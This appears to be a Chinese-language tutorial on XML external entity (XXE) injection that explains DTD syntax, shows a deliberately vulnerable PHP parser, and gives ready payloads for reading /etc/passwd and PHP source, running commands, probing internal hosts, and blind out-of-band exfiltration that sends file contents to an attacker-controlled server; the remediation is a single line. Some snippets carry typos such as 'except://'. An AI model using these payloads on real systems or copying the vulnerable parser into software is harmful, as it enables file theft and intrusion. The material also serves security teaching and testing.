# XXE漏洞

[传送门](https://www.cnblogs.com/20175211lyz/p/11413335.html)

**漏洞原理**

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。**XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害**





**XXE是XML外部实体(XML External Entity)注入的简称，在OWASP TOP 10 中位居A4，属于严重级别的漏洞，此攻击可能导致任意文件读取，远程代码执行，拒绝服务，SSRF，内网端口探测等**

![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629946396091-c96807bc-763f-4bd0-995f-107756606642.png?x-oss-process=image%2Fresize%2Cw_750%2Climit_0)





XML是可扩展性标记语言，类似HTML的标记语言，但标签是自定义的。DTD是文档类型定义，用来为XML文档定义语义约束可以在xml文件中声明，也可以在外部引用
XML文件结构:

```xml
<? xml version="1.0" encoding="utf-8"?>
DTD部分（可选）
<root>Test</root>
```



# **支持的协议**

![Untitled.png](https://img-blog.csdnimg.cn/img_convert/8477879a23c77446bd804052a90cf64d.png)











# DTD引用和实体声明

- DTD内部声明：`<!DOCTYPE 根元素 [实体声明]>`
- DTD外部引用：`<!DOCTYPE 根元素名称 SYSTEM “外部DTD的URL”>`
- DTD内部实体声明：`<!ENTITY 实体名称 “实体的值”>`
- DTD外部实体声明：`<!ENTITY 实体名称 SYSTEM “URI/URL”>`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY name "XXE test">]>
<root>&name;</root>
```









# 漏洞原因

- 没有过滤用户提交的XML数据
- 使用的开发语言可以解析XML外部实体，如PHP环境中libxml库=》2.9.0默认启用了外部实体

**PHP漏洞示例代码**

```php
<? php
$xml=isset($_POST['xxe'])?simplexml_load_string($_POST['xxe']):" ";
print_r($xml)
?>
```





# 漏洞常见位置

- 涉及到提交XML数据的功能处
- XML文件上传处
- office文档上传预览处
- 某些json格式传递数据的地方，可以修改其Content-Type为application/xml,并尝试进行XXE注入





# 有回显payload

找到上传XML文件，引用外部XML文件或提交XML数据的位置，提交以下数据：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY name "XXE test">]>
<root>&name;</root>
```

**页面返回XXE test字符说明存在xxe漏洞**，如图：



![Untitled 2.png](https://img-blog.csdnimg.cn/img_convert/08ad7a0862aa2a81b8ddc54b3d0cff37.png)



# 读取任意文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY name SYSTEM "file:///etc/passwd">]>
<root>&name;</root>
----------------------------------------------------------
读取php文件
<!DOCTYPE root [
<!ENTITY name SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>     //使用了php伪协议，并使用base64加密了
```

**读取/etc/passwd文件如图**：

![Untitled 3.png](https://img-blog.csdnimg.cn/img_convert/b989c9bdae961e7709ddfe8ebc2241d0.png)

**读取php文件，如图：**

![Untitled 4.png](https://img-blog.csdnimg.cn/img_convert/e1de79f80de7b392d8ad53f0afba212a.png)*







# 命令执行

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY name SYSTEM "except://ls">]>    //liunx系统ls命令
<root>&name;</root>
```



![Untitled7.png](https://img-blog.csdnimg.cn/img_convert/c819e19071455e5730bdc20ab2311441.png)





# 内网探测

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY name SYSTEM "http://192.168.1.1">]>
<root>&name;</root>
```





# 无回显Payload

利用DNSLog检测

```xml
<?xml version=”1.0” encoding=”UTF-8”?>  
<!DOCTYPE ANY [
<!ENTITY name SYSTEM "http://h99ddx.dnslog.cn/eval.xml">]>      
 <root>&name;</root>
```





![Untitled 6.png](https://img-blog.csdnimg.cn/img_convert/244736da3e71b40001f3edea81e0069e.png)



或者

```xml
<?xml version = "1.0"?>
<!DOCTYPE test [
		<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">
		<!ENTITY % dtd SYSTEM "http://192.168.xx.xxx:80XX/test.dtd">
		%dtd;
		%send;
]>


test.dtd:
<!ENTITY % payload
	"<!ENTITY &#x25; send SYSTEM
'http://192.168.xx.xxx:80xx/?data=%file;'>"
>
%payload;
```

**上面的url一般是自己的网站，通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了**





# 外部实体注入

Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://192.168.142.1:8888/evil.xml">     //引用了外部的文件
%remote;
%all;
%send;
]>
<root>&name;</root>
```

**evil.xml文件内容**

```xml
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://192.168.142.1:8888/1.php?file=%file;'>">
```





# 修复方式

禁用外部实体